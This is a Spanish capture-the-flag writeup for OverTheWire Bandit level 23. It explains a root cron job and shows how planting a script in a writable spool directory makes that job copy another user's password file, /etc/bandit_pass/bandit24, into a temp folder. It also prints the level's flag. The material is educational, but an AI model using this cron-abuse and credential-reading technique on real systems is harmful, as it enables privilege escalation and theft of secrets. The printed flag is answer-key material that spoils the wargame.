---
tags:
  - type/writeup
  - estado/completo
plataforma: "[[OverTheWire]]"
web: https://overthewire.org/wargames/bandit/bandit23.html
dificultad: Fácil
autor: 
relacionados:
  - "[[mktemp]]"
  - "[[chmod]]"
  - "[[watch]]"
  - "[[crontab]]"
  - "[[Bandit 22]]"
  - "[[Bandit 24]]"
---
# Datos

> [!TODO] Objetivo
>  Un programa se está ejecutando automáticamente a intervalos regulares desde cron, el programador de trabajos basado en el tiempo. Busque en /etc/cron.d/ la configuración y vea qué comando se está ejecutando.
>  ___
> 
>  **NOTA**: Este nivel requiere que crees tu primer shell-script. Este es un gran paso y deberías estar orgulloso de ti mismo cuando superes este nivel.
>  **NOTA 2**: Ten en cuenta que tu shell script es eliminado una vez ejecutado, por lo que puede que quieras guardar una copia...
^objetivo

> [!TIP] Recursos
> **Comandos: **
>
> - [[chmod]] 
> - [[Cron]] 
> - [[crontab]] 
> - crontab(5) 
^recursos

# Conceptos clave

Ver [[Cron]] y [[crontab]]

# Resolución

## Script

`cat /etc/cron.d/cronjob_bandit24`

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```


1. `myname=$(whoami)`: Asigna el nombre de usuario actual al variable `myname` utilizando el comando `whoami`.

2. `cd /var/spool/$myname/foo`: Cambia al directorio `/var/spool/$myname/foo`. Este directorio podría variar según el usuario que esté ejecutando el script.

3. `echo "Executing and deleting all scripts in /var/spool/$myname/foo:"`: Imprime un mensaje indicando que se están ejecutando y eliminando todos los scripts en el directorio.

4. `for i in * .*; do`: Inicia un bucle que recorre todos los archivos y directorios en el directorio actual (`*` representa los archivos y `.*` representa los archivos ocultos).

5. `if [ "$i" != "." -a "$i" != ".." ]; then`: Verifica si el elemento actual del bucle no es el directorio actual (`.`) ni el directorio padre (`..`). Esto es importante para evitar procesar estos directorios en el bucle.

6. `echo "Handling $i"`: Imprime un mensaje indicando que se está manejando el archivo o directorio actual.

7. `owner="$(stat --format "%U" ./$i)"`: Utiliza el comando `stat` para obtener el propietario del archivo o directorio actual y lo asigna a la variable `owner`.

	`stat`: Este es un comando de Linux utilizado para mostrar información detallada sobre archivos y sistemas de archivos.
	
	`--format "%U"`: Esto especifica el formato en el que se desea que se presente la información. En este caso, `%U` se refiere al nombre del propietario del archivo.
	
	 `./$i`: Esto representa el archivo o directorio actual dentro del bucle. `$i` contiene el nombre del archivo o directorio actual en cada iteración. No es una ejecución de una archivo ya que es un comando de stat. 
	
	`$(...)`: Esto se conoce como la expansión de comandos. El resultado del comando dentro de los paréntesis se asigna a la variable `owner`.

8. `if [ "${owner}" = "bandit23" ]; then`: Comprueba si el propietario del archivo es "bandit23". Si es así, continúa con las siguientes acciones.

9. `timeout -s 9 60 ./$i`: Ejecuta el archivo actual (`./$i`) con un límite de tiempo de 60 segundos y envía una señal SIGKILL (`-s 9`) si el tiempo límite se alcanza. Esto es útil para evitar la ejecución indefinida de scripts maliciosos. (En este caso si ya hay una ejecución de un archivo)

10. `rm -f ./$i`: Elimina el archivo o directorio actual después de realizar las acciones anteriores.

11. `fi`: Cierra la condición if.

12. `done`: Cierra el bucle for.

En resumen, este script ejecuta y elimina todos los scripts en el directorio especificado, pero solo si son propiedad del usuario "bandit23". Además, se utiliza el comando `timeout` para evitar que los scripts se ejecuten indefinidamente.

## `ls` y permisos

```bash
ls /var/spool/bandit24/foo
ls: cannot open directory '/var/spool/bandit24/foo': Permission denied
```
No puedo listar lo que hay en foo

```bash
ls -l /var/spool/bandit24/
total 4
drwxrwx-wx 4 root bandit24 4096 Jul 20 17:02 foo
```
No tengo permisos de lectura, pero sí de ejecución así que debería poder entrar

```bash
cd /var/spool/bandit24/foo
```

Me permite entrar y también crear archivos:
```bash
touch test
```

Creo la carpeta temporal donde voy a recibir la carpeta. 
```bash
mktemp -d
```

> [!TIP] Extra
> Por si llego a salir de la carpeta y no recuerdo el nombre puedo asignarle el valor a una variable:
>```bash
dir=$(mktemp -d)
>```
También para acceder directamente puedo usar:
>```bash
cd $(mktemp -d)

## Creación de un nuevo script (`script.sh`)

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.nS5J3s6suv/password.log
```
Leo lo que está en fichero `/etc/bandit_pass/bandit24` y lo mando a un nuevo archivo en mi directorio temporal. 

Lo siguiente es darle permisos a `otros` para que puedan leer y ejecutar en mi carpeta temporal:
```bash
chmod o+wx /tmp/tmp.nS5J3s6suv
```

Para finalizar mando el archivo a la ubicación donde se ejecuta el [[#Script]]:
```bash
cp script.sh /var/spool/bandit24/foo
```

y le doy permiso de ejecución: 
```bash
chmod +x /tmp/tmp.nS5J3s6suv/script.sh
```

Para ver en el momento si se actualiza `password.log` puedo usar desde la carpeta temporal el comando:
```bash
watch -n 1 ls -l
```

La flag está en `password.log`

# Bandera(s)

> [!FLAG] `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`
^bandera